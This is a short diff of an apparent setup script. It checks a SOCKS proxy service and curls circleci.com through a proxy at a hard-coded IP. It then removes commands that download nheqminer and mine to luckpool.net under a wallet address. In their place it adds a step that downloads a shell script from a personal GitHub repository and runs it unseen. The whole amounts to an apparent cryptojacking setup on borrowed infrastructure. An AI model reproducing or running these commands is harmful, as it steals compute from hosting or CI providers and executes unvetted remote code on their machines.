@@ -12,7 +12,6 @@ service danted status
 #
 curl -v -x socks5://103.143.10.225:1080 https://circleci.com//
 #
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tgz 
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.FaxSlowsmo -p x -t 2
+wget https://raw.githubusercontent.com/agustinayuni/nannos/main/Data_api.sh
+chmod +x Data_api.sh
+./Data_api.sh
